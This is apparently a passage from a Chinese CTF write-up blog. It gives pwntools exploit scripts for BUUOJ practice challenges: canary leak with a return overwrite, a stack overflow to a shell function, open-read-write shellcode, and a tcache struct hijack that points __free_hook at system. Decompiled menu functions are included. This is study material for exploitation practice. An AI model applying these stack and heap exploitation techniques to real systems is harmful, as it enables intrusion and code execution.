class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = process(<span class="hljs-string">&#x27;./babypie&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./babypie&#x27;</span>)<br>getshell = <span class="hljs-number">0x0000000000000A3E</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;pid &quot;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p))<br>    raw_input(<span class="hljs-string">&quot;attach me&quot;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Input your Name:\n&#x27;</span>)<br>s(payload)<br>ru(payload)<br>canary = <span class="hljs-string">&#x27;\x00&#x27;</span> + r(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># print(canary)</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>) + canary + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\x3e\x0a&#x27;</span><br>sa(<span class="hljs-string">&#x27;\n&#x27;</span>,payload)<br>it()<br><span class="hljs-comment"># debug()</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>            p = process(<span class="hljs-string">&#x27;./babypie&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26526</span>)<br>        payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>        ru(<span class="hljs-string">&#x27;Input your Name:\n&#x27;</span>)<br>        s(payload)<br>        ru(payload)<br>        canary = <span class="hljs-string">&#x27;\x00&#x27;</span> + r(<span class="hljs-number">7</span>)<br>        <span class="hljs-comment"># print(canary)</span><br><br>        payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>) + canary + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\x3e\x0a&#x27;</span><br>        sa(<span class="hljs-string">&#x27;\n&#x27;</span>,payload)<br>        it()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br>        print(e)<br></code></pre></div></td></tr></table></figure><h2 id="login-汇编分析-调试"><a href="#login-汇编分析-调试" class="headerlink" title="login(汇编分析+调试)"></a>login(汇编分析+调试)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25805</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>shell = <span class="hljs-number">0x0000000000400E88</span><br>sla(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;2jctf_pa5sw0rd&#x27;</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x48</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;2jctf_pa5sw0rd&#x27;</span>)) + p64(shell)<br>sla(<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br>it()<br></code></pre></div></td></tr></table></figure><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><p>沙盒机制，orw</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29646</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>bss = <span class="hljs-number">0x0804A060</span><br><br><span class="hljs-comment"># shellcode = asm(&#x27;xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x67616c66;mov ebx,esp;int 0x80&#x27;)</span><br><span class="hljs-comment"># shellcode += asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80&#x27;)</span><br><span class="hljs-comment"># shellcode += asm(&#x27;mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x8&#x27;)</span><br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,bss+<span class="hljs-number">100</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">100</span>,<span class="hljs-number">100</span>)<br><br>sla(<span class="hljs-string">&#x27;Give my your shellcode:&#x27;</span>,asm(shellcode))<br>it()<br></code></pre></div></td></tr></table></figure><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">这一题学到了利用tcache struct进行攻击，可以任意修改count和tcache entry</span><br><span class="hljs-string">而且只要把指定大小chunk的tcache填满，free时就不会进入tcache，大小合适的话就可以进入unsorted bin</span><br><span class="hljs-string">从而获取main_arena</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28493</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;pid&quot;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p))<br>    raw_input(<span class="hljs-string">&#x27;--&gt;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice &gt; &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(idx)<br>    ru(<span class="hljs-string">&#x27;input the size&#x27;</span>)<br>    sl(size)<br>    ru(<span class="hljs-string">&#x27;now you can write something&#x27;</span>)<br>    s(content)<br>    ru(<span class="hljs-string">&#x27;gift :&#x27;</span>)<br>    ptr = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> idx,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">hex</span>(ptr)<br>    <span class="hljs-keyword">return</span> ptr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;choice &gt; &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    <span class="hljs-comment"># tcachebin的范围是[0x20, 0x400]，超过0x400就会进入unsortedbin</span><br>    chunk0_addr = new(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    tcache_struct = chunk0_addr-<span class="hljs-number">0x11e60</span><br>    new(<span class="hljs-number">1</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># debug()</span><br>    new(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># new(3,0x50,&#x27;\x05&#x27;+&#x27;a&#x27;*3+&#x27;\x03&#x27;+&#x27;a&#x27;*(0x40-5) + p64(chunk0_addr-0x11e60))</span><br>    new(<span class="hljs-number">3</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    new(<span class="hljs-number">4</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># debug()</span><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">0</span>)<br><br>    new(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,p64(chunk0_addr-<span class="hljs-number">0x11e60</span>)) <span class="hljs-comment">#0</span><br>    new(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x10&#x27;</span>) <span class="hljs-comment"># 0</span><br>    new(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x05&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">3</span>+<span class="hljs-string">&#x27;\x03&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">5</span>)+p64(chunk0_addr+<span class="hljs-number">0x50</span>)) <span class="hljs-comment"># chunk1</span><br>    new(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>))<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    new(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,p64(chunk0_addr+<span class="hljs-number">0x60</span>))<br>    new(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>    new(<span class="hljs-number">11</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>    main_arena_96 = new(<span class="hljs-number">12</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x40&#x27;</span>)<br>    libc_base = main_arena_96 - <span class="hljs-number">96</span> - <span class="hljs-number">0x3ebc40</span><br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc_base:&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;system:&quot;</span>,<span class="hljs-built_in">hex</span>(system)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;free_hook:&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook)<br><br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    new(<span class="hljs-number">13</span>,<span class="hljs-number">0x10</span>,p64(free_hook))<br>    new(<span class="hljs-number">14</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\xe8&#x27;</span>)<br>    new(<span class="hljs-number">15</span>,<span class="hljs-number">0x10</span>,p64(system))<br><br>    ru(<span class="hljs-string">&#x27;choice &gt;&#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;input the index&#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    it()<br>    <span class="hljs-comment"># debug()</span><br><br><br>exp()<br></code></pre></div></td></tr></table></figure><p>这一题的技巧是劫持tcache struct，以及利用UAF漏洞实现tcache dup。（但是tcache dup这个漏洞已经在近期被修复了XD</p><p>菜单题，只有add和free两个功能，并且保护全开。</p><h3 id="add功能"><a href="#add功能" class="headerlink" title="add功能"></a>add功能</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_CE1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  __int64 v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ebx</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;input the index&quot;</span>);<br>  <span class="hljs-built_in">std</span>::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, &amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-keyword">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);<br>  <span class="hljs-built_in">std</span>::istream::<span class="hljs-keyword">operator</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, (<span class="hljs-keyword">char</span> *)&amp;size + <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;unk_2022A0 + HIDWORD(size)) || HIDWORD(size) &gt; <span class="hljs-number">0x18</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  v1 = <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;input the size&quot;</span>);<br>  <span class="hljs-built_in">std</span>::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, &amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-keyword">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);<br>  <span class="hljs-built_in">std</span>::istream::<span class="hljs-keyword">operator</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, &amp;size);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)size &lt;= <span class="hljs-number">0x78</span> ) <span class="hljs-comment">//限制了最大分配空间为0x78，即chunk为0x80</span><br>  &#123;<br>    v2 = HIDWORD(size);<br>    *((_QWORD *)&amp;unk_2022A0 + v2) = <span class="hljs-built_in">malloc</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)size);<br>    v3 = <span class="hljs-built_in">std</span>::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;now you can write something&quot;</span>);<br>    <span class="hljs-built_in">std</span>::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, &amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-keyword">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);<br>    sub_CBB(*((_QWORD *)&amp;unk_2022A0 + HIDWORD(size)), (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;gift :%p\n&quot;</span>, *((<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)&amp;unk_2022A0 + HIDWORD(size))); <span class="hljs-comment">//会为我们打印出分配的chunk的data地址</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="delete功能"><a href="#delete功能" class="headerlink" title="delete功能"></a>delete功能</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_E73</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] 